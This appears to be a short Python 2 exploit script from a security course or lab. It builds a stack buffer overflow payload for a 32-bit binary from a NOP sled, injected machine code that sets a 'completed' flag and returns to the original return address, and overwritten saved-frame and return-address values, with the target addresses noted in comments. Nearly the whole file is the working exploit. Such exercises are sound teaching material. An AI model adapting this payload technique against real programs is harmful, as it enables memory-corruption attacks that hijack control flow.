#!/usr/bin/python

# address of completed: 0x804a044
# original ret addr: 0x080485b4
# saved ebp: 0xbffffc18
# between ebp and end of buf: 16 bytes
# location of i: end of buff + 4 bytes (value 0x104)
name = "Jamie Floyd\x00"
buf = "\x90"*(256-12-13) # fills up 256 long buffer, leaving room for attack
attack1 = "\xc6\x05\x44\xa0\x04\x08\x01"
attack2 = "\x68\xb4\x85\x04\x08\xc3"
pad1 = "\x00"*4
i = "\x04\x01\x00\x00"
pad2 = "\x90"*8
ebp = "\x18\xfc\xff\xbf"
ret = "\x90\xa0\x04\x08"
extra = "\x80\xa0\x04\x08"
print name+buf+attack1+attack2+pad1+i+pad2+ebp+ret+extra
